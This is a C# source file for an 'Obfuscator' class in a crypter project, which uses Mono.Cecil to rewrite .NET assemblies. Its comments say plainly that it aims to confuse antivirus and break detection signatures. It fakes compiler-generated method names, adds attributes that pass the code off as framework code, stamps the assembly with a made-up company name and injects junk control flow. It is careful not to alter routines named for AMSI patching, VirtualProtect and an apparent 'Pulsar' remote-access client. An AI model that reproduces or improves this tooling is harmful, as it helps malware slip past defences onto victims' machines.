using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Cecil.Rocks;
using System;
using System.Linq;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Text;

namespace Crypter.Utils
{
    public class Obfuscator
    {
        static Random rng = new Random();

        public static void Obfuscate(string inputpath, string outputpath)
        {
            var asm = AssemblyDefinition.ReadAssembly(inputpath);
            
            // Add assembly-level junk attributes to confuse AV
            AddJunkAssemblyAttributes(asm);
            
            foreach (var type in asm.MainModule.Types)
            {
                if (!type.IsClass || type.Name.StartsWith("<") || 
                    type.Name.Contains("Program") || type.Name.Contains("Main") ||
                    type.Name.Contains("Process") || type.Name.Contains("Stream") ||
                    type.Name.Contains("Pulsar") || type.Name.Contains("Connect") ||
                    type.Name.Contains("RSA") || type.Name.Contains("Encrypt") ||
                    type.Name.Contains("Crypto") || type.Name.Contains("Security") ||
                    type.Name.Contains("SimpleXor") || type.Name.Contains("AMSI") ||
                    type.Name.Contains("XorEncrypt") || type.Name.Contains("Marshal") ||
                    type.Name.Contains("DeobfuscateStrings") || type.Name.Contains("ReplaceFakeChars") ||
                    type.Name.Contains("GetPatchBytes") || type.Name.Contains("VirtualProtect") ||
                    type.FullName.Contains("System.Diagnostics") || 
                    type.FullName.Contains("System.IO") ||
                    type.FullName.Contains("System.Security.Cryptography")) continue;

                // Add junk custom attributes to confuse signature detection
                AddJunkAttributes(type);

                foreach (var method in type.Methods.Where(m => m.HasBody))
                {
                    if (!method.IsConstructor && 
                        !method.Name.Contains("Process") && 
                        !method.Name.Contains("Start") && 
                        !method.Name.Contains("Pulsar") && 
                        !method.Name.Contains("Connect") &&
                        !method.Name.Contains("Export") && 
                        !method.Name.Contains("Key") && 
                        !method.Name.Contains("Wait") && 
                        !method.Name.Contains("Begin") &&
                        !method.Name.Contains("Output") && 
                        !method.Name.Contains("Error") &&
                        !method.Name.Contains("Read") && 
                        !method.Name.Contains("Write") &&
                        !method.Name.Contains("File") && 
                        !method.Name.Contains("Encode") &&
                        !method.Name.Contains("Environment") && 
                        !method.Name.Contains("Redirect") &&
                        !method.Name.Contains("Main") &&
                        !method.Name.Contains("PatchAMSI") &&
                        !method.Name.Contains("DeobfuscateStrings") &&
                        !method.Name.Contains("ReplaceFakeChars") &&
                        !method.Name.Contains("GetPatchBytes"))
                    {
                        // Use truly random names with variable patterns to break signatures
                        method.Name = GenerateRandomMethodName();
                        
                        // Add junk attributes to methods
                        AddJunkAttributes(method);
                    }
                    
                    ObfuscateControlFlow(method);
                }
            }

            // Mutate assembly with special metadata
            MutateAssemblyIdentity(asm);
            
            asm.Write(outputpath);
        }

        public static void ObfuscateMinimal(string inputpath, string outputpath)
        {
            var asm = AssemblyDefinition.ReadAssembly(inputpath);
            
            // Only add basic assembly-level attributes
            MutateAssemblyIdentity(asm);
            
            foreach (var type in asm.MainModule.Types)
            {
                // Skip critical types entirely
                if (!type.IsClass || type.Name.StartsWith("<") || 
                    type.Name.Contains("Program") || type.Name.Contains("Main") ||
                    type.Name.Contains("Process") || type.Name.Contains("Stream") ||
                    type.Name.Contains("Pulsar") || type.Name.Contains("Connect") ||
                    type.Name.Contains("RSA") || type.Name.Contains("Encrypt") ||
                    type.Name.Contains("Crypto") || type.Name.Contains("Security") ||
                    type.Name.Contains("SimpleXor") || type.Name.Contains("AMSI") ||
                    type.Name.Contains("XorEncrypt") || type.Name.Contains("Marshal") ||
                    type.Name.Contains("DeobfuscateStrings") || type.Name.Contains("ReplaceFakeChars") ||
                    type.Name.Contains("GetPatchBytes") || type.Name.Contains("VirtualProtect") ||
                    type.FullName.Contains("System.Diagnostics") || 
                    type.FullName.Contains("System.IO") ||
                    type.FullName.Contains("System.Security.Cryptography")) continue;

                // Only rename methods that are clearly not related to functionality
                foreach (var method in type.Methods.Where(m => m.HasBody))
                {
                    // Be much more selective about which methods to rename
                    if (!method.IsConstructor && 
                        !method.Name.Contains("Process") && 
                        !method.Name.Contains("Start") && 
                        !method.Name.Contains("Pulsar") && 
                        !method.Name.Contains("Connect") &&
                        !method.Name.Contains("Export") && 
                        !method.Name.Contains("Key") && 
                        !method.Name.Contains("Wait") && 
                        !method.Name.Contains("Begin") &&
                        !method.Name.Contains("Output") && 
                        !method.Name.Contains("Error") &&
                        !method.Name.Contains("Read") && 
                        !method.Name.Contains("Write") &&
                        !method.Name.Contains("File") && 
                        !method.Name.Contains("Encode") &&
                        !method.Name.Contains("Environment") && 
                        !method.Name.Contains("Redirect") &&
                        !method.Name.Contains("Main") &&
                        !method.Name.Contains("PatchAMSI") &&
                        !method.Name.Contains("DeobfuscateStrings") &&
                        !method.Name.Contains("ReplaceFakeChars") &&
                        !method.Name.Contains("GetPatchBytes") &&
                        !method.Name.Contains("Simple") &&
                        !method.Name.Contains("Decrypt") &&
                        !method.HasParameters && // Skip methods with parameters for safety
                        method.Parameters.Count == 0 &&
                        method.ReturnType.FullName == "System.Void") // Only rename void methods with no parameters
                    {
                        // Use simpler renaming that's less likely to break functionality
                        method.Name = "m_" + RandomString(5);
                    }
                }
            }

            asm.Write(outputpath);
        }

        private static void MutateAssemblyIdentity(AssemblyDefinition asm)
        {
            // Change non-critical assembly metadata to break signatures
            asm.Name.Culture = "";
            
            // Generate random version numbers
            Random rnd = new Random(DateTime.Now.Millisecond);
            int major = rnd.Next(1, 10);
            int minor = rnd.Next(0, 100);
            int build = rnd.Next(1000, 9999);
            int revision = rnd.Next(10000, 99999);
            
            asm.Name.Version = new Version(major, minor, build, revision);
            
            // Add some legitimate-looking module attributes
            var attrType = asm.MainModule.ImportReference(typeof(System.Reflection.AssemblyCompanyAttribute));
            var attrCtor = asm.MainModule.ImportReference(attrType.Resolve().GetConstructors().First());
            var companyAttr = new CustomAttribute(attrCtor);
            companyAttr.ConstructorArguments.Add(new CustomAttributeArgument(
                asm.MainModule.TypeSystem.String, "Legitimate Software Inc."));
            asm.CustomAttributes.Add(companyAttr);
        }

        private static void AddJunkAssemblyAttributes(AssemblyDefinition asm)
        {
            // Add benign-looking assembly attributes to confuse AV
            string[] attributeNames = {
                "System.Reflection.AssemblyTitleAttribute",
                "System.Reflection.AssemblyDescriptionAttribute",
                "System.Reflection.AssemblyConfigurationAttribute",
                "System.Runtime.CompilerServices.CompilationRelaxationsAttribute",
                "System.Runtime.Versioning.TargetFrameworkAttribute"
            };
            
            string[] attributeValues = {
                "Utility App",
                "Common Utility Framework",
                "Release",
                "8", // CompilationRelaxations value
                ".NETFramework,Version=v4.8"
            };
            
            for (int i = 0; i < attributeNames.Length; i++)
            {
                try 
                {
                    var attributeType = Type.GetType(attributeNames[i]);
                    if (attributeType != null)
                    {
                        var attrTypeRef = asm.MainModule.ImportReference(attributeType);
                        var attrCtor = asm.MainModule.ImportReference(
                            attributeType.GetConstructor(new[] { typeof(string) }));
                            
                        if (attrCtor != null)
                        {
                            var customAttr = new CustomAttribute(attrCtor);
                            customAttr.ConstructorArguments.Add(
                                new CustomAttributeArgument(asm.MainModule.TypeSystem.String, attributeValues[i]));
                            asm.CustomAttributes.Add(customAttr);
                        }
                    }
                }
                catch
                {
                    // Ignore if attribute can't be added
                }
            }
        }

        private static void AddJunkAttributes(ICustomAttributeProvider provider)
        {
            try
            {
                // Add compiler-generated attribute to make it look like system code
                var asm = (provider as TypeDefinition)?.Module.Assembly ?? 
                          (provider as MethodDefinition)?.Module.Assembly;
                          
                if (asm != null)
                {
                    // CompilerGeneratedAttribute
                    var compGenType = typeof(System.Runtime.CompilerServices.CompilerGeneratedAttribute);
                    var attrTypeRef = asm.MainModule.ImportReference(compGenType);
                    var attrCtor = asm.MainModule.ImportReference(
                        compGenType.GetConstructor(Type.EmptyTypes));
                        
                    if (attrCtor != null)
                    {
                        var customAttr = new CustomAttribute(attrCtor);
                        provider.CustomAttributes.Add(customAttr);
                    }
                    
                    // DebuggerNonUserCodeAttribute - makes the code look like framework code
                    var debuggerType = typeof(System.Diagnostics.DebuggerNonUserCodeAttribute);
                    var debugAttrTypeRef = asm.MainModule.ImportReference(debuggerType);
                    var debugAttrCtor = asm.MainModule.ImportReference(
                        debuggerType.GetConstructor(Type.EmptyTypes));
                        
                    if (debugAttrCtor != null)
                    {
                        var customAttr = new CustomAttribute(debugAttrCtor);
                        provider.CustomAttributes.Add(customAttr);
                    }
                }
            }
            catch
            {
                // Ignore errors in attribute creation
            }
        }

        private static string GenerateRandomMethodName()
        {
            // Create method names that look like compiler-generated methods
            string prefix = "<>";
            string[] middleParts = { "g__", "b__", "c__", "d__", "f__" };
            string[] suffixParts = { "LambdaMethod", "AnonymousMethod", "LocalFunction" };
            
            Random rand = new Random();
            string middle = middleParts[rand.Next(middleParts.Length)];
            string suffix = suffixParts[rand.Next(suffixParts.Length)];
            int number = rand.Next(100, 999);
            
            return $"{prefix}{middle}{number}_{suffix}";
        }

        private static void ObfuscateControlFlow(MethodDefinition method)
        {
            if (method.IsConstructor || method.Name == "Main" || 
                method.Name.Contains("Process") || method.Name.Contains("Start") || 
                method.Name.Contains("Pulsar") || method.Name.Contains("Connect") ||
                method.Name.Contains("Export") || method.Name.Contains("Key") || 
                method.Name.Contains("Wait") || method.Name.Contains("Begin") ||
                method.Name.Contains("Output") || method.Name.Contains("Error") ||
                method.Name.Contains("Read") || method.Name.Contains("Write") ||
                method.Name.Contains("File") || method.Name.Contains("Encode") ||
                method.Name.Contains("Environment") || method.Name.Contains("Redirect") ||
                method.Name.Contains("RSA") || method.Name.Contains("Create") ||
                method.Name.Contains("Encrypt") || method.Name.Contains("Decrypt") ||
                method.Name.Contains("Integer") || method.Name.Contains("Length") ||
                method.Name.Contains("SimpleXor") || method.Name.Contains("XorEncrypt") ||
                method.Name.Contains("PatchAMSI") || method.Name.Contains("AMSI") ||
                method.Name.Contains("DeobfuscateStrings") || method.Name.Contains("ReplaceFakeChars") ||
                method.Name.Contains("GetPatchBytes") || method.Name.Contains("VirtualProtect") ||
                method.Name.Contains("Marshal"))
            {
                return;
            }
            
            if (method.DeclaringType.Name.Contains("Process") || 
                method.DeclaringType.Name.Contains("Pulsar") ||
                method.DeclaringType.Name.Contains("Stream") ||
                method.DeclaringType.FullName.Contains("System.Diagnostics") ||
                method.DeclaringType.FullName.Contains("System.IO"))
            {
                return;
            }
            
            if (method.HasParameters && method.Parameters.Any(p => 
                p.ParameterType.Name.Contains("Process") || 
                p.ParameterType.Name.Contains("Stream") ||
                p.ParameterType.Name.Contains("RSA") ||
                p.ParameterType.Name.Contains("Crypto")))
            {
                return;
            }
            
            if (method.ReturnType.Name.Contains("Process") ||
                method.ReturnType.Name.Contains("Stream") ||
                method.ReturnType.Name.Contains("RSA") ||
                method.ReturnType.Name.Contains("Crypto"))
            {
                return;
            }

            var il = method.Body.GetILProcessor();
            var instructions = method.Body.Instructions.ToList();

            if (instructions.Count <= 2)
                return;

            // Apply one of several obfuscation techniques
            Random rand = new Random();
            int technique = rand.Next(0, 3);
            
            switch (technique)
            {
                case 0:
                    // Standard branching obfuscation
                    ApplyBranchingObfuscation(method, il, instructions);
                    break;
                case 1:
                    // Exception-based control flow obfuscation
                    ApplyExceptionObfuscation(method, il, instructions);
                    break;
                default:
                    // Switch-based control flow obfuscation
                    ApplySwitchObfuscation(method, il, instructions);
                    break;
            }

            // Add delay/junk code to evade AV pattern matching
            AddJunkCode(method);

            method.Body.OptimizeMacros();
        }
        
        private static void ApplyBranchingObfuscation(MethodDefinition method, ILProcessor il, List<Instruction> instructions)
        {
            var rand = new Random();
            for (int i = 1; i < instructions.Count - 1; i += rand.Next(3, 6))
            { 
                // Skip obfuscating critical instructions that may impact Pulsar functionality
                var currentInstr = instructions[i];
                
                // Skip obfuscating method calls, especially those that might be related to Pulsar
                if (currentInstr.OpCode == OpCodes.Call || 
                    currentInstr.OpCode == OpCodes.Callvirt ||
                    currentInstr.OpCode == OpCodes.Newobj)
                {
                    continue;
                }
                
                // Skip field access that might be related to Pulsar
                if ((currentInstr.OpCode == OpCodes.Ldfld || 
                     currentInstr.OpCode == OpCodes.Stfld ||
                     currentInstr.OpCode == OpCodes.Ldsfld ||
                     currentInstr.OpCode == OpCodes.Stsfld) && 
                    (currentInstr.Operand != null && 
                     currentInstr.Operand.ToString().Contains("Process") ||
                     currentInstr.Operand.ToString().Contains("Pulsar") ||
                     currentInstr.Operand.ToString().Contains("Stream")))
                {
                    continue;
                }
                
                OpCode branchOpCode;
                int branchChoice = rand.Next(0, 3);

                switch (branchChoice)
                {
                    case 0:
                        branchOpCode = OpCodes.Br_S; 
                        break;
                    case 1:
                        branchOpCode = OpCodes.Brfalse_S;
                        break;
                    default:
                        branchOpCode = OpCodes.Brtrue_S;  
                        break;
                }

                var br = il.Create(branchOpCode, instructions[i]);
                il.InsertBefore(instructions[i], br);
                if (rand.Next(0, 4) == 0)
                {
                    il.InsertBefore(instructions[i], il.Create(OpCodes.Nop));
                }
            }
            
            for (int i = 0; i < 3; i++)
            {
                var redundantOp = rand.Next(0, 2) == 0 ? OpCodes.Ldnull : OpCodes.Nop;
                il.InsertBefore(instructions[0], il.Create(redundantOp));
            }
        }
        
        private static void ApplyExceptionObfuscation(MethodDefinition method, ILProcessor il, List<Instruction> instructions)
        {
            if (instructions.Count < 10) return;
            
            try
            {
                // Find a good spot in the middle of the method
                int middleIndex = instructions.Count / 2;
                
                // Create exception handler structure
                var exceptionHandler = new ExceptionHandler(ExceptionHandlerType.Finally);
                
                // Set up try block
                exceptionHandler.TryStart = instructions[2]; // Start a bit into the method
                exceptionHandler.TryEnd = instructions[middleIndex];
                
                // Set up handler block
                exceptionHandler.HandlerStart = instructions[middleIndex];
                exceptionHandler.HandlerEnd = instructions[instructions.Count - 2]; // End before return
                
                // Add the handler to the method
                if (!method.Body.HasExceptionHandlers)
                    method.Body.ExceptionHandlers.Add(exceptionHandler);
                
                // Add some junk before the try
                il.InsertBefore(instructions[2], il.Create(OpCodes.Nop));
                il.InsertBefore(instructions[2], il.Create(OpCodes.Ldstr, ""));
                il.InsertBefore(instructions[2], il.Create(OpCodes.Pop));
            }
            catch
            {
                // Fallback to standard branching if exception handling fails
                ApplyBranchingObfuscation(method, il, instructions);
            }
        }
        
        private static void ApplySwitchObfuscation(MethodDefinition method, ILProcessor il, List<Instruction> instructions)
        {
            if (instructions.Count < 15) return;
            
            try
            {
                // Insert a switch statement near the beginning
                int insertPoint = 3;
                if (insertPoint >= instructions.Count) return;
                
                // Push a random value that will always hit case 0
                il.InsertBefore(instructions[insertPoint], il.Create(OpCodes.Ldc_I4_0));
                
                // Create switch cases - all pointing to the next instruction
                var switchTargets = new Instruction[] { instructions[insertPoint + 1], instructions[insertPoint + 1] };
                il.InsertBefore(instructions[insertPoint], il.Create(OpCodes.Switch, switchTargets));
                
                // Insert dummy instruction that's never reached
                il.InsertBefore(instructions[insertPoint], il.Create(OpCodes.Nop));
            }
            catch
            {
                // Fallback to standard branching if switch obfuscation fails
                ApplyBranchingObfuscation(method, il, instructions);
            }
        }

        private static void AddJunkCode(MethodDefinition method)
        {
            // Do nothing for methods that need to be preserved
            if (method.Name.Contains("SimpleXor") ||
                method.Name.Contains("Pulsar") ||
                method.Name.Contains("Process") ||
                method.Name.Contains("PatchAMSI") ||
                method.Name.Contains("DeobfuscateStrings") ||
                method.Name.Contains("ReplaceFakeChars") ||
                method.Name.Contains("GetPatchBytes"))
            {
                return;
            }

            var il = method.Body.GetILProcessor();
            var instructions = method.Body.Instructions.ToList();

            if (instructions.Count < 5)
                return;

            var rand = new Random();
            
            // Choose from several junk code patterns
            int junkType = rand.Next(0, 4);
            
            switch (junkType)
            {
                case 0:
                    // String manipulation junk
                    TryAddStringJunk(method, il, instructions);
                    break;
                case 1:
                    // Math calculation junk
                    TryAddMathJunk(method, il, instructions);
                    break;
                case 2:
                    // Array manipulation junk
                    TryAddArrayJunk(method, il, instructions);
                    break;
                case 3:
                    // GUID junk
                    TryAddGuidJunk(method, il, instructions);
                    break;
            }
        }
        
        private static void TryAddStringJunk(MethodDefinition method, ILProcessor il, List<Instruction> instructions)
        {
            try
            {
                // Find a good spot near the end of the method but not after a return
                for (int i = instructions.Count - 5; i > instructions.Count / 2; i--)
                {
                    if (instructions[i].OpCode != OpCodes.Ret &&
                        instructions[i].OpCode != OpCodes.Throw)
                    {
                        // Insert some simple string manipulation code that doesn't affect anything
                        il.InsertAfter(instructions[i], il.Create(OpCodes.Ldstr, ""));
                        il.InsertAfter(instructions[i+1], il.Create(OpCodes.Call, method.Module.ImportReference(typeof(string).GetMethod("IsNullOrEmpty", new[] { typeof(string) }))));
                        il.InsertAfter(instructions[i+2], il.Create(OpCodes.Pop));
                        break;
                    }
                }
            }
            catch
            {
                // Ignore if insertion fails
            }
        }
        
        private static void TryAddMathJunk(MethodDefinition method, ILProcessor il, List<Instruction> instructions)
        {
            try
            {
                // Find a good spot
                for (int i = instructions.Count - 5; i > instructions.Count / 2; i--)
                {
                    if (instructions[i].OpCode != OpCodes.Ret &&
                        instructions[i].OpCode != OpCodes.Throw)
                    {
                        // Insert some math calculations that don't affect anything
                        il.InsertAfter(instructions[i], il.Create(OpCodes.Ldc_I4, 42));
                        il.InsertAfter(instructions[i+1], il.Create(OpCodes.Ldc_I4, 7));
                        il.InsertAfter(instructions[i+2], il.Create(OpCodes.Mul));
                        il.InsertAfter(instructions[i+3], il.Create(OpCodes.Pop));
                        break;
                    }
                }
            }
            catch
            {
                // Ignore if insertion fails
            }
        }
        
        private static void TryAddArrayJunk(MethodDefinition method, ILProcessor il, List<Instruction> instructions)
        {
            try
            {
                // Find a good spot
                for (int i = instructions.Count - 5; i > instructions.Count / 2; i--)
                {
                    if (instructions[i].OpCode != OpCodes.Ret &&
                        instructions[i].OpCode != OpCodes.Throw)
                    {
                        // Create a small array and access it
                        il.InsertAfter(instructions[i], il.Create(OpCodes.Ldc_I4_3)); // array size
                        il.InsertAfter(instructions[i+1], il.Create(OpCodes.Newarr, method.Module.TypeSystem.Byte));
                        il.InsertAfter(instructions[i+2], il.Create(OpCodes.Dup));
                        il.InsertAfter(instructions[i+3], il.Create(OpCodes.Ldc_I4_0)); // index
                        il.InsertAfter(instructions[i+4], il.Create(OpCodes.Ldc_I4, 255)); // value
                        il.InsertAfter(instructions[i+5], il.Create(OpCodes.Stelem_I1));
                        il.InsertAfter(instructions[i+6], il.Create(OpCodes.Pop));
                        break;
                    }
                }
            }
            catch
            {
                // Ignore if insertion fails
            }
        }
        
        private static void TryAddGuidJunk(MethodDefinition method, ILProcessor il, List<Instruction> instructions)
        {
            try
            {
                // Find a good spot
                for (int i = instructions.Count - 5; i > instructions.Count / 2; i--)
                {
                    if (instructions[i].OpCode != OpCodes.Ret &&
                        instructions[i].OpCode != OpCodes.Throw)
                    {
                        // Create a GUID and convert to string
                        il.InsertAfter(instructions[i], il.Create(OpCodes.Call, method.Module.ImportReference(typeof(Guid).GetMethod("NewGuid"))));
                        il.InsertAfter(instructions[i+1], il.Create(OpCodes.Call, method.Module.ImportReference(typeof(Guid).GetMethod("ToString", Type.EmptyTypes))));
                        il.InsertAfter(instructions[i+2], il.Create(OpCodes.Pop));
                        break;
                    }
                }
            }
            catch
            {
                // Ignore if insertion fails
            }
        }

        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[rng.Next(s.Length)]).ToArray());
        }
    }
}
